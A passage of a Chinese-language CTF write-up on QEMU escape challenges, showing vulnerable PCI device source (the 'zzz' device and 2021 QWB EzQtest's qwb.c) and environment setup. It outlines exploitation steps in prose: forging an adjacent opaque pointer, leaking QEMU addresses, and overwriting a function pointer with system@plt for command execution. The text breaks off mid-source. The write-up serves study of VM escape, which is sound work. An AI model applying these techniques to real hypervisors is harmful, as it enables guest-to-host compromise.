class="params">(PCIDevice *pdev)</span></span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">zzz_class_init</span><span class="params">(ObjectClass *oc, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    PCIDeviceClass *k = PCI_DEVICE_CLASS(oc);</span><br><span class="line"></span><br><span class="line">    k-&gt;realize   = pci_zzz_realize;</span><br><span class="line">    k-&gt;<span class="built_in">exit</span>      = pci_zzz_uninit;</span><br><span class="line"></span><br><span class="line">    k-&gt;vendor_id = <span class="number">0x1234</span>;</span><br><span class="line">    k-&gt;device_id = <span class="number">0x2333</span>;</span><br><span class="line"></span><br><span class="line">    k-&gt;revision  = <span class="number">0x10</span>;</span><br><span class="line">    k-&gt;class_id  = PCI_CLASS_OTHERS; <span class="comment">/* 0xFF */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> TypeInfo zzz_info = &#123;</span><br><span class="line">    .name          = TYPE_ZZZ,</span><br><span class="line">    .parent        = TYPE_PCI_DEVICE,</span><br><span class="line">    .instance_size = <span class="keyword">sizeof</span>(ZZZState),</span><br><span class="line">    .instance_init = zzz_instance_init,</span><br><span class="line">    .class_init    = zzz_class_init,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">pci_zzz_register_types</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    type_register_static(&amp;zzz_info);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">type_init(pci_zzz_register_types);</span><br></pre></td></tr></table></figure></div>

<p><code>addr</code> 为 0x60 时存在 1 字节越界。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> ZZZ_CMD_KICK: &#123;</span><br><span class="line">    ZZZState *t = s-&gt;opaque;</span><br><span class="line">    <span class="keyword">if</span> ((t-&gt;addr &amp; <span class="number">0xFFF</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">int16_t</span>  len1 = (<span class="type">int16_t</span>)t-&gt;len;</span><br><span class="line">        <span class="type">uint32_t</span> off  = t-&gt;offset;</span><br><span class="line">        <span class="type">uint16_t</span> l    = (<span class="type">uint16_t</span>)(len1 &amp; <span class="number">0x7FFE</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((<span class="type">int</span>)(off + (<span class="type">uint32_t</span>)(len1 &amp; <span class="number">0x7FFE</span>) - <span class="number">1</span>) &lt;= <span class="number">0x1000</span>) &#123;</span><br><span class="line">            <span class="type">uint8_t</span> *buf = &amp;t-&gt;buf[off];</span><br><span class="line">            <span class="type">void</span> (*fn)(hwaddr, <span class="type">uint8_t</span> *, hwaddr, <span class="type">int</span>) = s-&gt;cpu_physical_memory_rw;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (len1 &amp; <span class="number">1</span>) &#123;</span><br><span class="line">                fn(t-&gt;addr, buf, l, <span class="number">1</span>);  <span class="comment">/* write system memory (device -&gt; host) */</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                fn(t-&gt;addr, buf, l, <span class="number">0</span>);  <span class="comment">/* read system memory (host -&gt; device) */</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((<span class="type">int16_t</span>)t-&gt;len &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                pci_set_irq(&amp;t-&gt;parent_obj, <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>zzzState</code> 结构体中 <code>buf</code> 与 <code>opaque</code> 相邻，因此可以修改 <code>opaque</code>。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ZZZState</span> &#123;</span></span><br><span class="line">    PCIDevice parent_obj;</span><br><span class="line"></span><br><span class="line">    MemoryRegion mmio;</span><br><span class="line">    hwaddr addr;         <span class="comment">/* target physical address (page-aligned by &lt;&lt;12) */</span></span><br><span class="line">    <span class="type">uint16_t</span> len;        <span class="comment">/* operation length (and flags) */</span></span><br><span class="line">    <span class="type">uint16_t</span> offset;     <span class="comment">/* offset inside buf */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int16_t</span>  rsvd0;  <span class="comment">/* kept to mirror layout (unused) */</span></span><br><span class="line">    <span class="type">int16_t</span>  rsvd1;  <span class="comment">/* kept to mirror layout (unused) */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span>  buf[ZZZ_BUF_SIZE];</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ZZZState</span> *<span class="title">opaque</span>;</span></span><br><span class="line">    <span class="type">void</span> (*cpu_physical_memory_rw)(hwaddr, <span class="type">uint8_t</span> *, hwaddr, <span class="type">int</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>而 <code>cpu_physical_memory_rw</code> 用的 <code>addr</code>，<code>len</code>，<code>offset</code> 都是通过 <code>opaque</code> 指针定位的，因此修改 <code>opaque</code> 指针指向伪造的 <code>opaque</code> 可以伪造 <code>addr</code>，<code>len</code>，<code>offset</code> 造成更大范围的越界读写。</p>
<p>通过越界读写 <code>buf</code> 后面的数据可以泄露 qemu 地址和劫持程序执行流。</p>
<h2 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ul>
<li>越界写把 <code>opaque</code> 改大使得 <code>opaque</code> 指针指向的 <code>opaque</code> 的 <code>addr</code> ，<code>len</code> ，<code>offset</code> 为我们在 <code>buf</code> 中伪造的。</li>
<li>越界读出 <code>opaque</code> 和 <code>cpu_physical_memory_rw</code> ，从而泄露 <code>opaque</code> 地址和 <code>qemu</code> 地址。</li>
<li>由于此时 <code>addr == 0x60</code> 只能进行读操作，因此我们需要使用 <code>addr == 0x50</code> 时的异或 0x209 来修改 <code>len</code> 使得 <code>addr == 0x60</code> 可以进行写操作。为了让异或的后的 <code>len</code> 和 <code>offset</code> 在 <code>addr == 0x60</code> 时可以通过检查并且能够有足够多的越界，前面第一步伪造的 <code>addr</code> 和 <code>len</code> 需要进行爆破。</li>
<li>越界写覆盖 <code>cpu_physical_memory_rw</code> 为 <code>system@plt</code> ， <code>opaque_ptr</code> 指向新的 <code>opaque</code> 并且新的 <code>opaque</code> 中的 <code>addr</code> 指向要执行的命令的地址，并且在要执行的的地址处写入命令。这里条件限制较多，特别是参数地址需要关于页对齐。为了尽可能满足条件，需要新的 <code>opaque</code> 地址尽可能小，也就是第一步伪造的 <code>offset</code> 异或 0x209 之后尽可能小。在第一步爆破的时候也要添加这一条件。</li>
</ul>
<h1 id="2021qwb-EzQtest"><a href="#2021qwb-EzQtest" class="headerlink" title="2021qwb-EzQtest"></a>2021qwb-EzQtest</h1><h2 id="环境搭建-4"><a href="#环境搭建-4" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>先打开 universe 源并刷新索引：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> add-apt-repository universe -y</span><br><span class="line"><span class="built_in">sudo</span> apt-get update</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> apt-get install -y \</span><br><span class="line">  xen-hypervisor-4.11-amd64 xen-utils-4.11 \</span><br><span class="line">  libxenstore3.0 libxentoolcore1 libxencall1 libxenmisc4.11 \</span><br><span class="line">  libxenforeignmemory1 libxengnttab1 libxenevtchn1 libxendevicemodel1</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> apt-get install -y \</span><br><span class="line">  libsnappy1v5 libfdt1 vde2 libiscsi7 librbd1 librados2 libaio1</span><br></pre></td></tr></table></figure></div>

<p>然后 <code>launch.sh</code> 以 <strong>qtest 测试机模式</strong>启动 QEMU：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">./qemu-system-x86_64 \</span><br><span class="line">  -display none \                 <span class="comment"># 不创建图形窗口（无 VGA/SDL/VNC）</span></span><br><span class="line">  -machine accel=qtest \          <span class="comment"># 使用 qtest 加速器：不运行CPU指令，只暴露设备+内存给qtest</span></span><br><span class="line">  -m 512M \                       <span class="comment"># 分配 512 MiB 来宾物理内存（0x00000000 ~ 0x1FFFFFFF）</span></span><br><span class="line">  -device qwb \                   <span class="comment"># 挂载你的 PCI 设备“qwb”（qwb 的 realize 里注册了 BAR0）</span></span><br><span class="line">  -nodefaults \                   <span class="comment"># 不加载默认外设（网卡、声卡、VGA、串口等都不自动加）</span></span><br><span class="line">  -monitor none \                 <span class="comment"># 关闭 QEMU HMP 监控台（不会出现 &quot;qemu&gt;&quot;）</span></span><br><span class="line">  -qtest stdio                    <span class="comment"># qtest 控制通道绑到标准输入/输出（行文本协议）</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><code>-machine accel=qtest -qtest stdio</code> &#x3D; <strong>qtest 测试机模式</strong>：</p>
<ul>
<li><p><strong>不启动 CPU&#x2F;固件&#x2F;OS</strong>；QEMU只把<strong>设备模型</strong>（比如你的 <code>qwb</code>）挂起来。</p>
</li>
<li><p>标准输入&#x2F;输出被用作 qtest 文本协议通道。</p>
</li>
<li><p>你可以发送命令去<strong>访问 guest 物理内存与 I&#x2F;O 端口</strong>，以及<strong>访问 MMIO</strong>：</p>
<ul>
<li>物理内存：<code>readb/readw/readl/readq</code>、<code>write* &lt;phys_addr&gt; [val]</code></li>
<li>I&#x2F;O 端口：<code>inb/inw/inl</code>、<code>outb/outw/outl &lt;port&gt; [val]</code></li>
</ul>
</li>
</ul>
</blockquote>
<h2 id="漏洞分析-6"><a href="#漏洞分析-6" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>首先题目代码如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// hw/misc/qwb.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;qemu/osdep.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;qapi/error.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hw/pci/pci.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hw/pci/pci_regs.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hw/mem/pc-dimm.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hw/qdev-properties.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;exec/memory.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hw/irq.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hw/qdev-clock.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hw/qdev-core.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;qemu/typedefs.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TYPE_QWB <span class="string">&quot;qwb&quot;</span></span></span><br><span class="line">OBJECT_DECLARE_SIMPLE_TYPE(QWBState, QWB)</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint64_t</span> <span class="type">dma_addr_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">dma_state</span> &#123;</span></span><br><span class="line">    <span class="type">dma_addr_t</span> src;</span><br><span class="line">    <span class="type">dma_addr_t</span> dst;</span><br><span class="line">    <span class="type">dma_addr_t</span> cnt;</span><br><span class="line">    <span class="type">dma_addr_t</span> cmd;   <span class="comment">// only LSB used</span></span><br><span class="line">&#125; dma_state;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">QWBState</span> &#123;</span></span><br><span class="line">    PCIDevice   pdev;              <span class="comment">// 0x000 ~ 0x8ff</span></span><br><span class="line">    MemoryRegion mmio;             <span class="comment">// 0x900 ~ 0x9ef</span></span><br><span class="line">    <span class="type">uint32_t</span>    dma_info_size;     <span class="comment">// 0x9f0</span></span><br><span class="line">    <span class="type">uint32_t</span>    dma_info_idx;      <span class="comment">// 0x9f4</span></span><br><span class="line">    <span class="type">uint32_t</span>    dma_using;         <span class="comment">// 0x9f8</span></span><br><span class="line">    <span class="type">uint32_t</span>    _pad;              <span class="comment">// 0x9fc</span></span><br><span class="line">    dma_state   dma_info[<span class="number">32</span>];      <span class="comment">// 0xa00 ~ 0xdff</span></span><br><span class="line">    <span class="type">uint8_t</span>     dma_buf[<span class="number">0x1000</span>];   <span class="comment">// 0xe00 ~ 0x1dff</span></span><br><span class="line">&#125; QWBState;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">uint64_t</span> <span class="title function_">qwb_mmio_read</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">unsigned</span> size)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span>     <span class="title function_">qwb_mmio_write</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">uint64_t</span> val, <span class="type">unsigned</span> size)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> MemoryRegionOps qwb_mmio_ops = &#123;</span><br><span class="line">    .read = qwb_mmio_read,</span><br><span class="line">    .write = qwb_mmio_write,</span><br><span class="line">    .endianness = DEVICE_NATIVE_ENDIAN,</span><br><span class="line">    .valid = &#123;</span><br><span class="line">        .min_access_size = <span class="number">4</span>,</span><br><span class="line">        .max_access_size = <span class="number">8</span>,</span><br><span class="line">        .unaligned = <span class="literal">false</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    .impl = &#123;</span><br><span class="line">        .min_access_size = <span class="number">4</span>,</span><br><span class="line">        .max_access_size = <span class="number">8</span>,</span><br><span class="line">        .unaligned = <span class="literal">false</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">qwb_do_dma</span><span class="params">(QWBState *s)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> i;</span><br><span class="line"></span><br><span class="line">    s-&gt;dma_using = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 第一段：边界检查（只检查 dma_buf 的界限）</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; s-&gt;dma_info_size; i++) &#123;</span><br><span class="line">        dma_state *d = &amp;s-&gt;dma_info[i];</span><br><span class="line">        <span class="keyword">if</span> (d-&gt;cmd) &#123; <span class="comment">// device -&gt; system</span></span><br><span class="line">            <span class="keyword">if</span> (d-&gt;src + d-&gt;cnt &gt; <span class="number">0x1000</span> || d-&gt;cnt &gt; <span class="number">0x1000</span>) &#123;</span><br><span class="line">                <span class="keyword">goto</span> end;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;      <span class="comment">// system -&gt; device</span></span><br><span class="line">            <span class="keyword">if</span> (d-&gt;dst + d-&gt;cnt &gt; <span class="number">0x1000</span> || d-&gt;cnt &gt; <span class="number">0x1000</span>) &#123;</span><br><span class="line">                <span class="keyword">goto</span> end;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 第二段：实际 DMA（漏洞点：期间可重入写 SIZE）</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; s-&gt;dma_info_size; i++) &#123;</span><br><span class="line">        dma_state *d = &amp;s-&gt;dma_info[i];</span><br><span class="line">        <span class="keyword">if</span> (d-&gt;cmd) &#123; <span class="comment">// write to system</span></span><br><span class="line">            pci_dma_write(&amp;s-&gt;pdev, d-&gt;dst, &amp;s-&gt;dma_buf[d-&gt;src], d-&gt;cnt);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;      <span class="comment">// read from system</span></span><br><span class="line">            pci_dma_read(&amp;s-&gt;pdev, d-&gt;src, &amp;s-&gt;dma_buf[d-&gt;dst], d-&gt;cnt);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">end:</span><br><span class="line">    s-&gt;dma_using = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">uint64_t</span> <span class="title function_">qwb_mmio_read</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">unsigned</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    QWBState *s = opaque;</span><br><span class="line">    <span class="type">uint64_t</span> v = ~<span class="number">0ULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size != <span class="number">8</span>) <span class="keyword">return</span> v;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (addr) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x00</span>: v = s-&gt;dma_info_size; <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x08</span>: <span class="keyword">if</span> (!s-&gt;dma_using) v = s-&gt;dma_info_idx; <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x10</span>: <span class="keyword">if</span> (!s-&gt;dma_using &amp;&amp; s-&gt;dma_info_idx &lt;= <span class="number">0x1F</span>) v = s-&gt;dma_info[s-&gt;dma_info_idx].src; <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x18</span>: <span class="keyword">if</span> (!s-&gt;dma_using &amp;&amp; s-&gt;dma_info_idx &lt;= <span class="number">0x1F</span>) v = s-&gt;dma_info[s-&gt;dma_info_idx].dst; <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x20</span>: <span class="keyword">if</span> (!s-&gt;dma_using &amp;&amp; s-&gt;dma_info_idx &lt;= <span class="number">0x1F</span>) v = s-&gt;dma_info[s-&gt;dma_info_idx].cnt; <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x28</span>: <span class="keyword">if</span> (!s-&gt;dma_using &amp;&amp; s-&gt;dma_info_idx &lt;= <span class="number">0x1F</span>) v = s-&gt;dma_info[s-&gt;dma_info_idx].cmd; <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x30</span>:</span><br><span class="line">        <span class="keyword">if</span> (!s-&gt;dma_using) &#123;</span><br><span class="line">            qwb_do_dma(s);</span><br><span class="line">            v = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>: <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">qwb_mmio_write</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">uint64_t</span> val, <span class="type">unsigned</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    QWBState *s = opaque;</span><br><span class="line">    <span class="keyword">if</span> (size != <span class="number">8</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (addr) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x00</span>:</span><br><span class="line">        <span class="keyword">if</span> (val &lt;= <span class="number">0x20</span>) s-&gt;dma_info_size = val; <span class="comment">// ❌ 未检查 s-&gt;dma_using</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x08</span>:</span><br><span class="line">        <span class="keyword">if</span> (!s-&gt;dma_using &amp;&amp; val &lt;= <span class="number">0x1F</span>) s-&gt;dma_info_idx = val;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x10</span>:</span><br><span class="line">        <span class="keyword">if</span> (!s-&gt;dma_using &amp;&amp; s-&gt;dma_info_idx &lt;= <span class="number">0x1F</span>) s-&gt;dma_info[s-&gt;dma_info_idx].src = val;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x18</span>:</span><br><span class="line">        <span class="keyword">if</span> (!s-&gt;dma_using &amp;&amp; s-&gt;dma_info_idx &lt;= <span class="number">0x1F</span>) s-&gt;dma_info[s-&gt;dma_info_idx].dst = val;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x20</span>:</span><br><span class="line">        <span class="keyword">if</span> (!s-&gt;dma_using &amp;&amp; s-&gt;dma_info_idx &lt;= <span class="number">0x1F</span>) s-&gt;dma_info[s-&gt;dma_info_idx].cnt = val;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x28</span>:</span><br><span class="line">        <span class="keyword">if</span> (!s-&gt;dma_using &amp;&amp; s-&gt;dma_info_idx &lt;= <span class="number">0x1F</span>) s-&gt;dma_info[s-&gt;dma_info_idx].cmd = (val &amp; <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">qwb_instance_init</span><span class="params">(Object *obj)</span></span><br><span class="line">&#123;</span><br><span class="line">    QWBState *s = QWB(obj);</span><br><span class="line">    s-&gt;dma_info_size = <span class="number">0</span>;</span><br><span class="line">    s-&gt;dma_info_idx  = <span class="number">0</span>;</span><br><span class="line">    s-&gt;dma_using     = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">qwb_realize</span><span class="params">(PCIDevice *pdev, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    QWBState *s = QWB(pdev);</span><br><span class="line">    memory_region_init_io(&amp;s-&gt;mmio, OBJECT(pdev), &amp;qwb_mmio_ops, s, <span class="string">&quot;qwb-mmio&quot;</span>, <span class="number">0x100000</span>);</span><br><span class="line">    pci_register_bar(pdev, <span class="number">0</span>, PCI_BASE_ADDRESS_SPACE_MEMORY, &amp;s-&gt;mmio);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">qwb_uninit</span><span class="params">(PCIDevice *pdev)</span></span><br><span class="line">&#123;</span><br><span class="line">    QWBState *s = QWB(pdev);</span><br><span class="line">    s-&gt;dma_info_size = s-&gt;dma_info_idx = s-&gt;dma_using = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">qwb_class_init</span><span class="params">(ObjectClass *oc, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    DeviceClass *dc = DEVICE_CLASS(oc);</span><br><span class="line">    PCIDeviceClass *k = PCI_DEVICE_CLASS(oc);</span><br><span class="line">    k-&gt;realize  = qwb_realize;</span><br><span class="line">    k-&gt;<span class="built_in">exit</span>     = qwb_uninit;</span><br><span class="line">    k-&gt;vendor_id = <span 